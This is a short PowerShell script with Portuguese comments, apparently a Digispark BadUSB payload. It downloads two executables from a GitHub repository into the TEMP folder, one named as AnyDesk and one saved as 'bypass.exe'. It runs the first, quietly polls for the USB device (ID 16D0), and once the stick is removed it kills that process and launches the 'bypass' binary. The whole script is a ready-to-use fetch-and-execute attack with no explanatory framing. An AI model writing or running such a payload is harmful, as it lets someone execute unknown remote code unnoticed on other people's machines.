$p = "$env:TEMP\main.exe"
$b = "$env:TEMP\bypass.exe"
$n = "AnyDesk"

# Baixa os arquivos direto para o PC
Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/AnyDesk.exe" -OutFile $p
Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/SYNC-Otimizer.exe" -OutFile $b

# Inicia o arquivo principal
Start-Process $p

# Vigilante invisível: Fica checando se o Digispark ainda está plugado
while (Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -like '*16D0*' }) {
    Start-Sleep -Seconds 1
}

# Se o loop quebrou, é porque você puxou o USB!
# Força o fechamento do principal e abre o Otimizador
Stop-Process -Name $n -Force -ErrorAction SilentlyContinue
Start-Process $b
